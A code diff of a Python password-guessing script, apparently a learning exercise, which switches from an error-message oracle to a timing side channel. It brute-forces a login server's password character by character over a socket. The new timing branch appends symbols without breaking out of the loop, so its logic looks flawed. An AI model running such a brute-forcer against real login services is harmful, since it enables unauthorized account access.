@@ -2,6 +2,7 @@ import json
 import socket
 import string
 import sys
+import time
 
 symbols = list(string.ascii_lowercase + string.digits)
 args = sys.argv
@@ -28,17 +29,18 @@ with socket.socket() as admin_socket:
             for symbol in string.printable:
                 python_dict = {'login': login, 'password': password + symbol}
                 json_dict = json.dumps(python_dict)
+                time_start = time.perf_counter()
                 admin_socket.send(json_dict.encode('utf8'))
                 buffer_size = 1024
                 message = admin_socket.recv(buffer_size)
-                if json.loads(message)["result"] == "Exception happened during login":
-                    password += symbol
-                    break
-                elif json.loads(message)["result"] == "Connection success!":
+                time_end = time.perf_counter()
+
+                if json.loads(message)["result"] == "Connection success!":
                     password += symbol
                     flag = False
                     break
+                elif time_end - time_start > 0.1:
+                    password += symbol
         python_dict = {'login': login, 'password': password}
         json_dict = json.dumps(python_dict, indent=4)
         print(json_dict)
-
